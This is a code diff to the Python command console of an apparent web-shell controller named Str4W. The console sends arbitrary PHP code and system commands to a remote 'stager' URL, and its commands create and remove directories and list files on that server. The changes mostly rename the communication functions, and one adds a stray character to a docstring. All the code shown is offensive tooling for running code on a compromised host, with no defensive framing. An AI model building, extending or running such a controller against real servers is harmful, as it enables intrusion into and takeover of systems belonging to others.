@@ -112,7 +112,7 @@ class Str4WConsole(cmd.Cmd):
         Execute the given line and print the response.
         """
 
-        response = communication.execute_command(self.stager_url, line)
+        response = communication.execute_code(self.stager_url, line)
         if len(response) > 300:
             if not ask_yn(f"The response size is {len(response)} bytes. Do you want to show it? [Y/N]: "):
                 return
@@ -138,7 +138,7 @@ class Str4WConsole(cmd.Cmd):
                           "probably throw an error, continue? [Y/N]: "):
                 return
 
-        response = communication.execute_payload(self.stager_url, payload)
+        response = communication.execute_code(self.stager_url, payload, True)
         if len(response) > 300:
             if not ask_yn(f"The response size is {len(response)} bytes. Do you want to show it? [Y/N]: "):
                 return
@@ -197,11 +197,11 @@ class Str4WConsole(cmd.Cmd):
         Create a new directory with the given name onto the stager server.
         """
 
-        if communication.execute_command(self.stager_url, f"echo is_dir('{name}');") == '1':
+        if communication.execute_code(self.stager_url, f"echo is_dir('{name}');") == '1':
             print_error("Target directory already exists.")
             return
 
-        if communication.execute_command(self.stager_url, f"mkdir('{name}', 0777, true) or die('A');") == 'A':
+        if communication.execute_code(self.stager_url, f"mkdir('{name}', 0777, true) or die('A');") == 'A':
             print_error("Failed to create target directory.")
             return
 
@@ -213,11 +213,11 @@ class Str4WConsole(cmd.Cmd):
         Removes the specified directory from the stager server.
         """
 
-        if communication.execute_command(self.stager_url, f"echo is_dir('{name}');") != '1':
+        if communication.execute_code(self.stager_url, f"echo is_dir('{name}');") != '1':
             print_error("Target directory does not exist.")
             return
 
-        if communication.execute_command(self.stager_url, f"echo rmdir('{name}');") != '1':
+        if communication.execute_code(self.stager_url, f"echo rmdir('{name}');") != '1':
             print_error("Failed to remove target directory.")
             return
 
@@ -232,18 +232,18 @@ class Str4WConsole(cmd.Cmd):
         if len(path) == 0:
             path = '.'
 
-        response = communication.execute_command(self.stager_url, f"chdir('{path}'); echo json_encode(glob('*'));")
+        response = communication.execute_code(self.stager_url, f"chdir('{path}'); echo json_encode(glob('*'));")
         print_info("Directory listing: ")
         for file in json.loads(response):
             print(f" - {file}")
 
     @check_stager_url
     def do_system(self, command: str):
-        """
+        """s
         Execute a terminal command onto the stager server. This command is not garanteed to work.
         """
 
-        response = communication.execute_system_command(self.stager_url, command)
+        response = communication.execute_system(self.stager_url, command)
         if len(response) > 300:
             if not ask_yn(f"The response size is {len(response)} bytes. Do you want to show it? [Y/N]: "):
                 return
